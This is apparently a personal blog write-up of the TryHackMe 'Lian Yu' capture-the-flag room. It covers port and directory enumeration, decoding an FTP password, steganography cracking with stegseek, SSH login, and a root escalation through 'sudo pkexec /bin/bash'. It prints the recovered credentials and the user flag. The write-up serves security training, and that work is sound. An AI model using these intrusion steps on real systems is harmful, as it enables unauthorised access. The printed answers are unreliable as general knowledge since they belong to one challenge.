---
title: Lian Yu
published: 2025-11-27
description: CTF - "Boot2root, Web exploitation, Privilege escalation, LFI"
image: "./lianyuIMG.jpeg"
tags: [CTF, CTF - easy] 
category: TryHackMe
draft: false
---

[THM](https://tryhackme.com/room/lianyu)

# 1. Discovery Ports, Services and Directory
## Nmap
`nmap -sC -sV -vv <IP Target>`
	![[Pasted image 20251203125804.png]]
**Ports**
- 21 - TCP/FTP(vsftpd3.0.2)
- 22 - TCP/SSH(OpenSSH 6.7p1)
- 80 - TCP/HTTP(Apache)
- 111/TCP - rpcbind
## Dirsearch 

### {TargetIP}
`python3 dirsearch.py -u 10.82.138.36 -w ../wordlist/DirBuster-2007_directory-list-2.3-medium.txt`
  * ![image](./Pasted%20image%2020251203133839.png)
### {TargetIP}/island
`python3 dirsearch.py -u 10.82.138.36/island/ -w ../wordlist/DirBuster-2007_directory-list-2.3-medium.txt`
* ![image](./Pasted%20image%2020251203134528.png)
## HTML source code {TargetIP}/island/
What is vigilante?
* ![image](./Pasted%20image%2020251205110533.png)
## HTML source code {TargetIP}/island/2100
* ![image](./Pasted%20image%2020251203140912.png)


## {TargetIP}/island/2100

### GoBuster
`gobuster dir -u 10.82.138.36/island/2100/ -w /home/dcroce/Documentos/ComofazerUbuntu/FerramentasSec/wordlist/DirBuster-2007_directory-list-2.3-medium.txt -x ticket -t 12`
* ![image](./Pasted%20image%2020251203155046.png)

## {TargetIP}/island/2100/green_arrow.ticket
![image](./Pasted%20image%2020251203155336.png)

# 2. Hashes & Post-Exploitation
### CyberChef

### From base58
	 RTy8yhBQdscX -> !#th3h00d
### FTP
`$ sudo ftp {targetIP}`
	- **user**: vigilante
	- **password**: !#th3h00d
* ![image](./Pasted%20image%2020251204152001.png)

```bash
ftp> ls -la  
229 Entering Extended Passive Mode (|||18166|).  
150 Here comes the directory listing.  
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .  
drwxr-xr-x    4 0        0            4096 May 01  2020 ..  
-rw-------    1 1001     1001           44 May 01  2020 .bash_history  
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout  
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc  
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user  
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile  
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png  
-rw-r--r--    1 0        0          549924 May 05  2020 "Queen's_Gambit.png"  
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg

ftp> mget aa.jpg Leave_me_alone.png "Queen's_Gambit.png" .other_user .profile
```
### Reading files using cat
```bash
ftp> !cat .other_user
 
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he ha  
d been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing  
troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realize  
d that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastere  
d every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first ch  
ild. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Winter  
green, to whom he would later return the favor.  
  
Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary  
soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept  
this career secret from his family, even though his wife was an expert military combat instructor.  
  
A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was ag  
ainst his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it,  
destroying Joseph's vocal cords and rendering him mute.  
  
After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, h  
is confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Witho  
ut his mask, Slade wears an eyepatch to cover his eye.
```
**Names**
1. Slade, Wilson
2. Adeline, Kane
3. Joseph, Wilson
4. Wintergreen, (apenas sobrenome — personagem é conhecido assim)
5. Jackal, (apelido/codinome — pode ser usado como uma palavra única)
### StegSeek


```bash
$ stegseek -sf aa.jpg -wl pathwordlist/rockyou.txt

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek  
[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
```

```bash
$ file aa.jpg.out 
aa.jpg.out: Zip archive data, at least v2.0 to extract, compression method=deflate
$ unzip -P password aa.jpg.out
Archive:  aa.jpg.out  
 inflating: passwd.txt                 
 inflating: shado

$ cat shado    
M3tahuman
```
# What do i have now?
Perhaps some unexplored directory, an untested **SSH port**, and some names and a word(M3tahuman).
### SSH
Using names
```bash 
$ ssh slade@{TargetIP}
password:M3tahuman
```

![image](./Pasted%20image%2020251205120827.png)
```bash
slade@LianYu:~$ ls  
user.txt  
slade@LianYu:~$ cat user.txt    
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}  
                       --Felicity Smoak  
```

![image](./Pasted%20image%2020251204192527.png)

![image](./Pasted%20image%2020251204191455.png)

```bash
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/bash  
root@LianYu:~#
root@LianYu:~# ls
root.txt
root@LianYu:~# cat root.txt
```